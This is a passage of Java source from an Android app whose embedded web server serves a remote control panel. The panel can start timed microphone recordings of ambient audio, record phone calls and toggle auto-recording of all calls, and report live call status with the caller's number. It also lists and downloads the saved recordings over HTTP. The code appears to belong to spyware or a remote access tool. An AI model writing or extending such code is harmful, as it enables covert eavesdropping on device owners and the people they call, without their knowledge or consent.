                "<div style=\"display: flex; justify-content: space-between; align-items: center;\">" +
                "<div>" +
                "<h3>" + (isRecording ? "&#128308; Recording Active" : "&#9899; Not Recording") + "</h3>";

        if (isRecording) {
            String recordingType = isRecordingCall ? "Call Recording" : "Microphone Recording";
            html += "<p style=\"color: #888; margin-top: 5px;\">" + recordingType + "</p>" +
                    "<div class=\"duration\" id=\"duration\">" + formatDuration((int) duration) + "</div>";
        }

        html += "</div>" +
                "<div>" +
                (isRecording
                        ? "<a href=\"/audio/" + (isRecordingCall ? "call" : "mic")
                                + "/stop\" class=\"btn btn-danger\">&#9724; Stop</a>"
                        : "")
                +
                "</div>" +
                "</div>" +
                "</div>";

        // Control buttons
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#127897; Microphone Recording</h3>" +
                "<p style=\"color: #888; margin-bottom: 15px;\">Capture ambient audio from device microphone</p>" +
                "<div>" +
                "<a href=\"/audio/mic/start\" class=\"btn btn-success\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">&#128308; Start Recording</a>" +
                "<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 30s</a>" +
                "<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 1min</a>" +
                "<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 5min</a>" +
                "</div>" +
                "</div>";

        // Call recording section
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#128222; Call Recording</h3>" +
                "<p style=\"color: #888; margin-bottom: 15px;\">Record phone calls automatically or manually</p>" +
                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;\">"
                +
                "<div class=\"toggle-container\">" +
                "<span>Auto-record calls:</span>" +
                "<a href=\"/audio/settings?auto_record=" + (!autoRecordEnabled) + "&save_on_device="
                + saveOnDeviceEnabled + "\" style=\"text-decoration: none;\">" +
                "<div class=\"toggle-switch " + (autoRecordEnabled ? "active" : "") + "\"></div>" +
                "</a>" +
                "</div>" +
                "<div class=\"toggle-container\">" +
                "<span>Save on device:</span>" +
                "<a href=\"/audio/settings?auto_record=" + autoRecordEnabled + "&save_on_device="
                + (!saveOnDeviceEnabled) + "\" style=\"text-decoration: none;\">" +
                "<div class=\"toggle-switch " + (saveOnDeviceEnabled ? "active" : "") + "\"></div>" +
                "</a>" +
                "</div>" +
                "</div>" +
                "</div>";

        // View recordings link
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#128190; Saved Recordings</h3>" +
                "<a href=\"/audio/recordings\" class=\"btn btn-primary\">View All Recordings</a>" +
                "<a href=\"/files/Music/RavanRecordings\" class=\"btn btn-success\">Open in File Manager</a>" +
                "</div>";

        // Auto-refresh script for status
        html += "<script>" +
                "setInterval(function() {" +
                "  fetch('/audio/status')" +
                "    .then(r => r.json())" +
                "    .then(data => {" +
                "      if (data.isRecording && document.getElementById('duration')) {" +
                "        var d = data.duration;" +
                "        var min = Math.floor(d / 60);" +
                "        var sec = d % 60;" +
                "        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;" +
                "      }" +
                "      if (data.callInProgress && !document.querySelector('.call-alert')) {" +
                "        location.reload();" +
                "      }" +
                "    });" +
                "}, 2000);" +
                "</script>";

        html += HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startMicRecording(Map<String, String> params) {
        int duration = 0;
        if (params.containsKey("duration")) {
            try {
                duration = Integer.parseInt(params.get("duration"));
            } catch (Exception e) {
                duration = 0;
            }
        }

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("START_MIC_RECORDING");
        intent.putExtra("duration", duration);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response stopMicRecording() {
        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("STOP_MIC_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startCallRecording(Map<String, String> params) {
        String phoneNumber = params.get("number");
        String callType = params.get("type");

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("START_CALL_RECORDING");
        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
        intent.putExtra("call_type", callType != null ? callType : "manual");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopCallRecording() {
        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("STOP_CALL_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping call recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioStatus() {
        boolean isRecording = CallRecordService.isRecording();
        boolean isRecordingCall = CallRecordService.isRecordingCall();
        boolean isRecordingMic = CallRecordService.isRecordingMic();
        boolean callInProgress = CallRecordService.isCallInProgress();
        String callNumber = CallRecordService.getCurrentCallNumber();
        String callType = CallRecordService.getCurrentCallType();
        long duration = CallRecordService.getRecordingDuration();
        String recordingPath = CallRecordService.getCurrentRecordingPath();
        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();

        String json = String.format(
                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
                        "\"duration\": %d, \"recordingPath\": %s, " +
                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
                isRecording, isRecordingCall, isRecordingMic,
                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
                autoRecordEnabled, saveOnDeviceEnabled);
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response updateAudioSettings(Map<String, String> params) {
        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("UPDATE_SETTINGS");
        intent.putExtra("auto_record", autoRecord);
        intent.putExtra("save_on_device", saveOnDevice);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                "<body></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioRecordings() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128190; Audio Recordings</h2>");

        // Get recordings directory
        File recordDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_MUSIC), "RavanRecordings");

        if (!recordDir.exists() || !recordDir.isDirectory()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
        } else {
            File[] files = recordDir.listFiles(
                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

            if (files == null || files.length == 0) {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
            } else {
                // Sort by date (newest first)
                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                html.append("<ul class=\"file-list\">");

                int count = 0;
                for (File file : files) {
                    if (count >= 50)
                        break; // Limit to 50 files

                    String fileName = file.getName();
                    String icon = "&#127897;";
                    String iconClass = "file-icon-audio";

                    // Determine recording type from filename
                    String recordType = "Unknown";
                    if (fileName.startsWith("CALL_incoming")) {
                        icon = "&#128222;";
                        recordType = "Incoming Call";
                    } else if (fileName.startsWith("CALL_outgoing")) {
                        icon = "&#128222;";
                        recordType = "Outgoing Call";
                    } else if (fileName.startsWith("MIC_")) {
                        icon = "&#127897;";
                        recordType = "Microphone";
                    }

                    html.append("<li class=\"file-item\">");
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
                            .append("</div>");
                    html.append("<div class=\"file-info\">");
                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                    html.append("<div class=\"file-meta\">");
                    html.append(recordType).append(" - ");
                    html.append(formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                    html.append("</div></div>");
                    html.append("<a href=\"/download/Music/RavanRecordings/").append(fileName)
                            .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem;\">Download</a>");
                    html.append("</li>");

                    count++;
                }

                html.append("</ul>");
            }
        }

        html.append("<div style=\"margin-top: 20px;\">");
        html.append(
                "<a href=\"/audio\" style=\"color: #e94560; text-decoration: none;\">&larr; Back to Audio Control</a>");
        html.append("</div>");
        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }
}
